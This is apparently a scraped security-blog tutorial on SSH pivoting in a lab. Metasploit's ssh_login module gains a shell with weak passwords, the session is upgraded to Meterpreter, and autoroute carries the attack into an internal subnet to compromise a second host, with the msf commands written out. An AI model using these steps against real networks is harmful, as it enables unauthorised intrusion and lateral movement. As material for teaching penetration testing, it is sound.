# SSH pivoting using Meterpreter

**Pivoting** is a technique to get inside an unreachable network with help of pivot \(center point\). In simple words, it is an attack through which an attacker can exploit that system which belongs to the different network. For this attack, the attacker needs to exploit the main server that helps the attacker to add himself inside its local network and then the attacker will able to target the client system for the attack.

![](https://i0.wp.com/3.bp.blogspot.com/-cYra6fZLKPA/Wc9AJJBSyrI/AAAAAAAARuI/lEBrXV6j1boVWTMXvtHf24zm6lgYnz8TgCLcBGAs/s1600/ssh.png?w=687&ssl=1)

This module will test ssh logins on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.msf &gt; use auxiliary/scanner/ssh/ssh\_login  
msf auxiliary\(ssh\_login\) &gt; set rhosts 192.168.0.109  
msf auxiliary\(ssh\_login\) &gt; set username raj  
msf auxiliary\(ssh\_login\) &gt; set password 123  
msf auxiliary\(ssh\_login\) &gt; exploit

| 12345 | msf &gt; use auxiliary/scanner/ssh/ssh\_loginmsf auxiliary\(ssh\_login\) &gt; set rhosts 192.168.0.109msf auxiliary\(ssh\_login\) &gt; set username rajmsf auxiliary\(ssh\_login\) &gt; set password 123msf auxiliary\(ssh\_login\) &gt; exploit |
| :--- | :--- |


From the given image you can observe that command shell **session 1** opened

![](https://i2.wp.com/3.bp.blogspot.com/-RGpwRHda6Jc/WZHOludI1cI/AAAAAAAAQ4U/0JQ2pyFRVUc4ILV-LkGRju7VV9VPjoSKACLcBGAs/s1600/1.png?w=687&ssl=1)

Now convert command shell into the meterpreter shell through the following commandsessions –u 1

| 1 | sessions –u 1 |
| :--- | :--- |


From the given image you can observe that **Meterpreter session 2** openedsessions

| 1 | sessions |
| :--- | :--- |


 ****Hence if you will count then currently attacker has hold 2 sessions, **1st** for **command shell** and **2nd** for **the meterpreter shell** of the SSH server.

![](https://i1.wp.com/2.bp.blogspot.com/-ISwbDHS6e9o/WZHOlnaF57I/AAAAAAAAQ4Y/3IIB2OgY_bwh8soBnkwrHiXIldXAVPpmgCLcBGAs/s1600/2.png?w=687&ssl=1)

Check network interface using **ifconfig** command

From the given image you can observe two network interface in the victim’s system **1st** for IP **192.168.0.109** through which the attacker is connected and **2nd** for IP **192.168.10.1** through which SSH client \(targets\) is connected.

![](https://i0.wp.com/1.bp.blogspot.com/-LV1_xBZ4Xo4/WZHOmpxbv2I/AAAAAAAAQ4g/6uui7OIF14UxqxhYOeDlDTDNuIjU-HLhgCLcBGAs/s1600/3.png?w=687&ssl=1)

Since the attacker belongs to **192.168.0.1** interface and client belongs to **192.168.10.0** interface, therefore, it is not possible to directly make an attack on client network until unless the attacker acquires the same network connection. In order to achieve 192.168.10.0 network attacker need to run the **post exploitation** “autoroute”.

This module manages session routing via an existing Meterpreter session. It enables other modules to ‘pivot’ through a compromised host when connecting to the named NETWORK and SUBMASK. Autoadd will search a session for valid subnets from the routing table and interface list then add routes to them. The default will add a default route so that all TCP/IP traffic not specified in the MSF routing table will be routed through the session when pivoting.msf &gt; use post/multi/manage/autoroute   
msf post\(autoroute\) &gt; set subnet 192.168.10.0  
msf post\(autoroute\) &gt; set session 2  
msf post\(autoroute\) &gt; exploit

| 1234 | msf &gt; use post/multi/manage/autoroute msf post\(autoroute\) &gt; set subnet 192.168.10.0msf post\(autoroute\) &gt; set session 2msf post\(autoroute\) &gt; exploit |
| :--- | :--- |


![](https://i0.wp.com/2.bp.blogspot.com/-ZkbWiQab364/WZHOm8ga0CI/AAAAAAAAQ4k/izvzlWYh4kk1inSEkKg5XeB2ovv6OP11gCLcBGAs/s1600/4.png?w=687&ssl=1)

This time we are exploiting **SSH ignite** \(local client\) therefore we are going to use the same module for it that had used above for SSH raj, only need to change information inside exploit.msf &gt; use auxiliary/scanner/ssh/ssh\_login  
msf auxiliary\(ssh\_login\) &gt; set rhosts 192.168.10.2  
msf auxiliary\(ssh\_login\) &gt; set username ignite  
msf auxiliary\(ssh\_login\) &gt; set password 1234  
msf auxiliary\(ssh\_login\) &gt; exploit

| 12345 | msf &gt; use auxiliary/scanner/ssh/ssh\_loginmsf auxiliary\(ssh\_login\) &gt; set rhosts 192.168.10.2msf auxiliary\(ssh\_login\) &gt; set username ignitemsf auxiliary\(ssh\_login\) &gt; set password 1234msf auxiliary\(ssh\_login\) &gt; exploit |
| :--- | :--- |


 ****From given image, you can see another **command shell 3** opened if you will count then total attack has hold 3 sessions, two for SSH server and one for the SSH client.sessions

| 1 | sessions |
| :--- | :--- |


1. Command shell for SSH raj \(192.168.0.109:22\)
2. Meterpreter shell for SSH raj \(192.168.0.109\)
3. Command shell for SSH ignite \(192.168.10.2:22\)

![](https://i1.wp.com/1.bp.blogspot.com/-m965kFVb2tc/WZHOm4e21mI/AAAAAAAAQ4o/Zy4CZmFc7YUOku3smI6OaLFWgsYddsuQACLcBGAs/s1600/5.png?w=687&ssl=1)

| 1 | sessions 3 |
| :--- | :--- |


Now attacker is command shell of SSH ignite \(client\), let’s verify through network configuration.ifconfig

| 1 | ifconfig |
| :--- | :--- |


From given, you can observe the network IP is **192.168.10.2**

\*\*\*\*

